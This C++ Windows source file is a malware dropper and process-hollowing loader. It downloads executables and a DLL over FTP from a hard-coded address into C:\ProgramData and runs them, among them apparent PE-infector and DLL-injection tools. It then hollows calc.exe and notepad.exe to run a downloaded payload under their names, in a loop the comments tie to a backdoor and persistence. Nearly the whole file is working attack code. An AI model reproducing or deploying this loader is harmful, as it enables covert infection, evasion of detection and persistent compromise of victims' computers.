#include <Windows.h>	
#include <iostream>
#include <winternl.h>
#include "misc.h"
#pragma comment(lib, "onecore.lib")
#include <WinInet.h>
#pragma comment(lib, "WinInet.lib")
#include<Shlobj.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

int Download(const char* from, const char* file) {
	DeleteUrlCacheEntry(from);
	HRESULT ret = URLDownloadToFile(0, from, file, 0, 0);
	if (FAILED(ret))
		return 1;
	return 0;
}

int Hollow(const char* exe, const char* cwd, const char* real){
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	startupInfo.cb = sizeof(startupInfo);
	ZeroMemory(&processInformation, sizeof(processInformation));
	int ret = 0;

	ret = CreateProcessA(
		exe,
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		NULL,
		cwd,
		&startupInfo,
		&processInformation);

	if (!ret) {
		std::cout << "CreateProcess failed!\n";
		return 1;
	}
	else
		std::cout << "CreateProcess\n";

	//Get Base adress
	PROCESS_BASIC_INFORMATION PBInfo;
	ZeroMemory(&PBInfo, sizeof(PBInfo));
	ULONG retSize = 0;

	HMODULE hNT = LoadLibraryA("ntdll");

	if (hNT == NULL)
		return 1;

	FARPROC fNtQueryInformationProcess = GetProcAddress(hNT, "NtQueryInformationProcess");
	if (fNtQueryInformationProcess == NULL)
		return 1;

	//FARPROC fNtUnmapViewOfSection = GetProcAddress(hNT, "NtUnmapViewOfSection");
	//if (fNtUnmapViewOfSection == NULL)
	//	return 1;

	NTSTATUS status = STATUS_SUCCESS;
	status = ((pNtQueryInformationProcess)fNtQueryInformationProcess)(processInformation.hProcess, ProcessBasicInformation, &PBInfo, sizeof(PBInfo), &retSize);

	if (!NT_SUCCESS(status))
		return status;

	//Read the PEB to get ImageBaseAddress
	_PEB12 PEB12;
	retSize = 0;
	ret = ReadProcessMemory(processInformation.hProcess, PBInfo.PebBaseAddress, &PEB12, sizeof(PEB12), &retSize);

	if (!ret)
		return 1;

	//Read DOSHEADER
	IMAGE_DOS_HEADER DOSHeader;
	ZeroMemory(&DOSHeader, sizeof(DOSHeader));
	retSize = 0;

	ret = ReadProcessMemory(processInformation.hProcess, PEB12.ImageBaseAddress, &DOSHeader, sizeof(DOSHeader), &retSize);

	if (!ret)
		return 1;

	WORD arch;
	retSize = 0;

	ret = ReadProcessMemory(processInformation.hProcess, (LPCVOID)((ULONG)PEB12.ImageBaseAddress + DOSHeader.e_lfanew + 4), &arch, sizeof(arch), &retSize);

	if (!ret)
		return 1;

	if (arch != 0x14c) //Not x86 spawn another process of x86 code not verified for x64
		return 1;
	/* //NOT NEEDED
	IMAGE_NT_HEADERS32 NtHeader;
	retSize = 0;

	ret = ReadProcessMemory(processInformation.hProcess, (LPCVOID)((ULONG)PEB12.ImageBaseAddress + DOSHeader.e_lfanew), &NtHeader, sizeof(NtHeader), &retSize);
	if (!ret)
		return 1;

	PIMAGE_SECTION_HEADER SectionHeaders = (IMAGE_SECTION_HEADER*)malloc(sizeof(IMAGE_SECTION_HEADER) * NtHeader.FileHeader.NumberOfSections);
	if (SectionHeaders == NULL)
		return 1;

	for (int i = 0; i < NtHeader.FileHeader.NumberOfSections; i++) {

		retSize = 0;

		ret = ReadProcessMemory(processInformation.hProcess, (LPCVOID)((ULONG)PEB12.ImageBaseAddress + DOSHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS32) + (sizeof(IMAGE_SECTION_HEADER) * i)), &(SectionHeaders[i]), sizeof(IMAGE_SECTION_HEADER), &retSize);
		if (!ret)
			return 1;

	}
	*/
	//Unmap original
	FARPROC fNtUnmapViewOfSection = GetProcAddress(hNT, "NtUnmapViewOfSection");
	if (fNtUnmapViewOfSection == NULL)
		return 1;

	status = ((pNtUnmapViewOfSection)fNtUnmapViewOfSection)(processInformation.hProcess, PEB12.ImageBaseAddress);

	if (!NT_SUCCESS(status))
		return status;

	//Need to allocate memory for the real program so we need to know the ImageSize reading the file header
	FILE* fsource;
	fopen_s(&fsource, real, "rb");

	fseek(fsource, 0, SEEK_END);
	DWORD DiskFileSize = ftell(fsource);
	fseek(fsource, 0, SEEK_SET);
	char* RawFile = (char*)malloc(DiskFileSize);

	fread(RawFile, DiskFileSize, 1, fsource);
	PIMAGE_DOS_HEADER SourceHeader = (PIMAGE_DOS_HEADER)RawFile; //SHOULD CHECK PROCESS ARCHITECTURE TO BE SURE
	PIMAGE_NT_HEADERS32 SourceNtHeader = (PIMAGE_NT_HEADERS32)((DWORD)RawFile + SourceHeader->e_lfanew);


	//VirtualFreeEx(processInformation.hProcess, PEB12.ImageBaseAddress, 0, MEM_DECOMMIT);

	//Something called enclave is beeing a pain in the ass here. Basically it does not allow to allocate the memory on the ImageBaseAdress and it appears that it occurs randomly so Null will be the base adress to get memory anywhere and then patch the image. Should check for SGX in the bios //Seems like is not enclave but problem with ASRL and memory sizes if there is no contiguous memory with the size requested because another section is under the one freed it will fail
	PVOID AllocatedMem = VirtualAllocEx(processInformation.hProcess, PEB12.ImageBaseAddress, SourceNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!AllocatedMem) {
		DWORD error = GetLastError();
		fclose(fsource);
		free(RawFile);
		//NOT NEEDED
		//free(SectionHeaders);
		TerminateProcess(processInformation.hProcess, 0);
		CloseHandle(processInformation.hProcess);
		CloseHandle(processInformation.hThread);
		return 1;
	}
	//char* zeros = (char*)malloc(SourceNtHeader->OptionalHeader.SizeOfImage); //For debug and memory compare 
	//ZeroMemory(zeros, SourceNtHeader->OptionalHeader.SizeOfImage);
	//WriteProcessMemory(processInformation.hProcess, AllocatedMem, zeros, SourceNtHeader->OptionalHeader.SizeOfImage, NULL);
	BOOL deltaplus = TRUE;
	DWORD BaseDelta = 0;
	if ((DWORD)AllocatedMem > SourceNtHeader->OptionalHeader.ImageBase){
		BaseDelta = (DWORD)AllocatedMem - SourceNtHeader->OptionalHeader.ImageBase;
		deltaplus = TRUE;
	}
	else {
		BaseDelta = SourceNtHeader->OptionalHeader.ImageBase - (DWORD)AllocatedMem;
		deltaplus = FALSE;
	}

	SourceNtHeader->OptionalHeader.ImageBase = (DWORD)AllocatedMem;

	WriteProcessMemory(processInformation.hProcess, AllocatedMem, RawFile, SourceNtHeader->OptionalHeader.SizeOfHeaders, NULL);

	PIMAGE_SECTION_HEADER SourceImSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)RawFile + SourceHeader->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + SourceNtHeader->FileHeader.SizeOfOptionalHeader);
	
	for (int i = 0; i < SourceNtHeader->FileHeader.NumberOfSections; i++) {
		PVOID DestinationAllocatedMemSection = (PVOID)((DWORD)AllocatedMem + SourceImSectionHeader->VirtualAddress);
		PVOID SourceAllocationMemSection = (PVOID)((DWORD)RawFile + SourceImSectionHeader->PointerToRawData);
		WriteProcessMemory(processInformation.hProcess, DestinationAllocatedMemSection, SourceAllocationMemSection, SourceImSectionHeader->SizeOfRawData,NULL);
		SourceImSectionHeader++;
	}

	//Restore point to the first section header since we will search for the .reloc one
	SourceImSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)RawFile + SourceHeader->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + SourceNtHeader->FileHeader.SizeOfOptionalHeader);

	IMAGE_DATA_DIRECTORY relocTb = SourceNtHeader->OptionalHeader.DataDirectory[5]; //5 is the relocation entry in the data dir array check PE documentation for info

	const char relocString[] = ".reloc";
	int test = strlen(relocString);
	//Now the addresses will be relocated since its needed for the loaded exe to work.
	for (int i = 0; i < SourceNtHeader->FileHeader.NumberOfSections; i++) {
		if (memcmp(SourceImSectionHeader->Name, relocString, strlen(relocString))) { 
			SourceImSectionHeader++;
			continue;
		} 

		DWORD SourceRelocRawData = SourceImSectionHeader->PointerToRawData;
		DWORD offset = 0;

		while (offset < relocTb.Size) {
			PBASE_RELOCATION_BLOCK relocBlock = (PBASE_RELOCATION_BLOCK)((DWORD)RawFile + SourceRelocRawData + offset);
			offset += sizeof(BASE_RELOCATION_BLOCK);
			DWORD relocEntriesNumber = ((relocBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY));
			PBASE_RELOCATION_ENTRY Entries = (PBASE_RELOCATION_ENTRY)((DWORD)RawFile + SourceRelocRawData + offset);

			for (DWORD j = 0; j < relocEntriesNumber; j++) {
				offset += sizeof(BASE_RELOCATION_ENTRY);

				if (Entries[j].Type == 0)
					continue;

				DWORD patchAddr = relocBlock->PageAddress + Entries[j].Offset;
				DWORD patchBuff = 0;
				ReadProcessMemory(processInformation.hProcess, (LPCVOID)((DWORD)AllocatedMem + patchAddr), &patchBuff, sizeof(DWORD), &retSize);
				if (deltaplus)
					patchBuff += BaseDelta;
				else
					patchBuff -= BaseDelta;

				WriteProcessMemory(processInformation.hProcess, (PVOID)((DWORD)AllocatedMem + patchAddr), &patchBuff, sizeof(DWORD), NULL);

			}
		}

	}

	CONTEXT context;
	ZeroMemory(&context, sizeof(context));

	context.ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(processInformation.hThread, &context);

	DWORD NewEntryPoint = (DWORD)AllocatedMem + SourceNtHeader->OptionalHeader.AddressOfEntryPoint;
	context.Eax = NewEntryPoint;
	SetThreadContext(processInformation.hThread, &context);
	ResumeThread(processInformation.hThread);

	fclose(fsource);
	free(RawFile);
	//NOT NEEDED
	//free(SectionHeaders);
	CloseHandle(processInformation.hProcess);
	CloseHandle(processInformation.hThread);
	return 0;
}


int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {

	HANDLE mutex = CreateMutexA(0, FALSE, "Hollow");
	if (GetLastError() == ERROR_ALREADY_EXISTS)
		return 1;

	Download("ftp://192.168.66.66/InfectPE.exe", "C:\\ProgramData\\InfectPE.exe");
	Sleep(500);
	Download("ftp://192.168.66.66/remote_morph.txt", "C:\\ProgramData\\remote_morph.txt");
	Sleep(500);
	int ret = 0;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	startupInfo.cb = sizeof(startupInfo);
	ZeroMemory(&processInformation, sizeof(processInformation));
	ret = CreateProcess(
		"C:\\ProgramData\\InfectPE.exe",
		NULL,
		NULL,
		NULL,
		FALSE,
		NULL,
		NULL,
		"C:\\ProgramData\\",
		&startupInfo,
		&processInformation);
	CloseHandle(processInformation.hProcess);
	CloseHandle(processInformation.hThread);

	Download("ftp://192.168.66.66/injectDllAllProcess.exe", "C:\\ProgramData\\injectDllAllProcess.exe");
	Sleep(500);
	Download("ftp://192.168.66.66/hook32v2.dll", "C:\\ProgramData\\hook32v2.dll");
	Sleep(500);
	ret = 0;
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	startupInfo.cb = sizeof(startupInfo);
	ZeroMemory(&processInformation, sizeof(processInformation));
	ret = CreateProcess(
		"C:\\ProgramData\\injectDllAllProcess.exe",
		NULL,
		NULL,
		NULL,
		FALSE,
		NULL,
		NULL,
		"C:\\ProgramData\\",
		&startupInfo,
		&processInformation);
	CloseHandle(processInformation.hProcess);
	CloseHandle(processInformation.hThread);

	while (true) {

		Download("ftp://192.168.66.66/Paguroidea.exe", "C:\\ProgramData\\Paguroidea.exe");
		Sleep(500);
		HANDLE mutex2 = NULL;
		mutex2 = CreateMutexA(0, FALSE, "Paguroidea");
		if (GetLastError() != ERROR_ALREADY_EXISTS && mutex2!=NULL) {
			CloseHandle(mutex2);
			int ret = Hollow("C:\\Windows\\System32\\calc.exe", "C:\\Windows\\System32\\", "C:\\ProgramData\\Paguroidea.exe");
			while (ret) {
				ret = Hollow("C:\\Windows\\System32\\calc.exe", "C:\\Windows\\System32\\", "C:\\ProgramData\\Paguroidea.exe");
			}
		}
		else
			if(mutex2 != NULL)
				CloseHandle(mutex2);
		HANDLE mutex3 = NULL;
		mutex3 = CreateMutexA(0, FALSE, "Paguroidea2");
		if (GetLastError() != ERROR_ALREADY_EXISTS && mutex3 != NULL) {
			CloseHandle(mutex3);
			int ret = Hollow("C:\\Windows\\System32\\notepad.exe", "C:\\Windows\\System32\\", "C:\\ProgramData\\Paguroidea.exe");
			while (ret) {
				ret = Hollow("C:\\Windows\\System32\\notepad.exe", "C:\\Windows\\System32\\", "C:\\ProgramData\\Paguroidea.exe");
			}

		}
		else
			if (mutex3 != NULL)
				CloseHandle(mutex3);
		//Here goes the backdor and malware code which will have persistence
		MessageBox(NULL, "Try to delete me!", "PWND", MB_OK);
		//HIDE
		Sleep(25000);
	}
	return 0;
}